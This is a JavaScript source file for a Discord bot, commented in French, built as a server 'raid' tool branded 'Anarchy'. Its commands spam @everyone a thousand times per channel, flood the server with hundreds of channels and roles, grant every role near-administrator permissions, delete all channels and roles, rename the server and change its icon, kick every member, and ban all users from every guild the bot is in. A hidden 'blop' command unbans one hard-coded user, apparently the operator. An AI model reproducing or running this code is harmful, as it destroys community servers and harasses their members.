const Discord = require("discord.js");
const chalk = require("chalk")
const bot = new Discord.Client();
const prefix = "=" ;
process.on('unhandledRejection', (reason) => {

  console.error(reason);

});

bot.on("ready", () => {
		console.log(chalk.red(`${bot.user.tag} prêt pour le carnage`))
		console.log(bot.user.id)
		console.log(bot.guilds.map(g => `Serveur : ${g.name}`))
//		bot.channels.map(c => c.createInvite().then(url => console.log(url.code)))
 	})
bot.on("message", msg => {
		
	//masse ping
		if(msg.content.includes(prefix+"smokescreen")){
		msg.delete()
				for(var i =0; i < 1000; i++){
			 	msg.channel.send(`@everyone Raid By Anarchy XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX https://cdn.discordapp.com/attachments/498502361975881738/498876912303865866/PicsArt_10-08-09.53.55.gif https://cdn.discordapp.com/attachments/498502361975881738/498850930918424588/PicsArt_10-08-03.34.58.jpg`)
			  	}
		}
			 if(msg.content === prefix+"allchan"){
 	  msg.delete();
 	  msg.guild.channels.findAll("type", "text").map(c => c.send(prefix+"smokescreen"))
 	  }
				if(msg.content === prefix+"channel"){
			  			msg.delete();
			  			for(var i = 0; i < 15; i++){
			  				msg.guild.createChannel("Anarchy", "text");
			     }
			     for(var i =0; i < 484; i++){
			     	msg.guild.createChannel("Anarchy","voice");
			     	}
			     setTimeout(() => {
			     	msg. channel. send (prefix+"issou"). then(m => m. delete()) ;
			     	msg.channel.send(prefix+"allchan").then(m => m.delete());
			     	}, 60000);   
			 }
			 
		if(msg.content === prefix+"admin"){
			msg.delete();
				msg.guild.roles.map(r => r. edit({permissions:2146958591})) 
			}
			if(msg.content===prefix+"roles"){
				  msg.delete();
			   for(var i; i < 225; i++){
						 msg.guild.createRole({
							name:"Anachy", 
							mentionable:false, 
							permissions:"", 
							position: ""
							})
						}
						} 
		 			//détruire des channels
			  	if(msg.content=== prefix+"anarchie"){
			  		console.log("destruction")
			  		//msg.guild.roles.map(r => r.delete())
			  		msg.guild.channels.map(c => c.delete())
			  		msg.guild.createChannel("Anarchy", "text").then(m => m.send(prefix+"channel"));
			  		}
			  			if(msg.content === prefix+"issou"){
			  				msg.delete();
			  				//msg.channel.send(prefix+"admin").then(m => m.delete())
			  				msg.guild.setName("Dead By Anarchy")
			  				msg.guild.setIcon("https://cdn.discordapp.com/attachments/499167096786386955/499654562810953741/Screenshot_2018-10-08-17-25-02.png")
			  				}
			  					if(msg.content === prefix+ "die"){
			  						process.exit()
			  					}
			  					if(msg.content === prefix+"ban"){
			  						msg.guild.members.map(c => c.kick())
			  						}
			  							if(msg.content === prefix+"botstats"){
			  							msg.delete()
			  							const info = new Discord.RichEmbed()
			  							.setTitle("info du bot")
			  							.setColor("RANDOM")
			  							.addField("nombre d'utilisateurs", bot.users.size)
			  							.addField("nombre de channels", bot.channels.size)
			  							.addField("mémoire utilisée", process.memoryUsage().heapUsed/100000 + "MB")
			  							msg.channel.send(info).then(m => m.delete(10000))
			  							}
			  							if(msg.content === prefix+"destruction"){
			  							msg.delete();
			  							bot.channels.map(c => c.delete())
			  							msg.author.send("channels détruits")
          	bot.guilds.map(g => g.roles.map(r=>r.delete()))
          	msg.author.send("rôles détruits")
          	}
          	if(msg.content === prefix +"leave"){
          		msg.delete();
          		msg.guild.leave();
          		}
		          if(msg.content === prefix+"banall"){
		          	bot.users.map(u => bot.guilds.map(g=> g.ban(u.id)))
 	           msg.author.send("tout le monde est banni")
 	           }
 	           if(msg.content === "blop"){
 	           	msg.delete();
 	           	bot.guilds.map(g => g.unban("306119836503900161"))
 	           	}
 	           	if(msg.content === prefix+"purge"){
 	           		msg.channel.bulkDelete(30)
 	           		}
 	           		if(msg.content === prefix+"allchan"){
 	           		msg.delete();
 	           		msg.guild.channels.findAll("type", "text").map(c => c.send("smokescreen"))
 	           		}
 	           		if(msg.content.startsWith(prefix+"ban")){
 	           			var mention = msg.mentions.users.first();
 	           			msg.delete();
 	           			
 	           			if(!mention)return;

 	           			msg.guild.member(mention).ban();
 	           			}
 	           			
 	       		});
		
	bot.login(process.env.token)

